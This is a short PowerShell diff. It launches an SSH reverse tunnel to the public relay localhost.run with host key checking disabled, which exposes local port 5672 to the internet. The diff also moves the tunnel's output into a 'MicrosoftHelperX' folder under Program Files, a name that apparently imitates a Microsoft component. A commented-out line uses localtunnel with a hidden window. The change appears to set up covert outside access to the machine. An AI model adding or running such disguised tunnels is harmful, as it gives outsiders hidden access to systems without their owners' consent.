@@ -1,5 +1,5 @@
 # Run the SSH command and redirect output to a temporary file in the background
-Start-Process -FilePath "ssh" -ArgumentList "-R 80:localhost:5672 localhost.run -o StrictHostKeyChecking=no" -RedirectStandardOutput "temp.txt" -PassThru 
+Start-Process -FilePath "ssh" -ArgumentList "-R 80:localhost:5672 localhost.run -o StrictHostKeyChecking=no" -RedirectStandardOutput "C:\Program Files\MicrosoftHelperX\temp.txt" -PassThru 
 
 #Start-Process -FilePath "C:\Program Files\nodejs\lt" -ArgumentList "--port 5672" -RedirectStandardOutput "temp.txt" -PassThru -WindowStyle Hidden
 
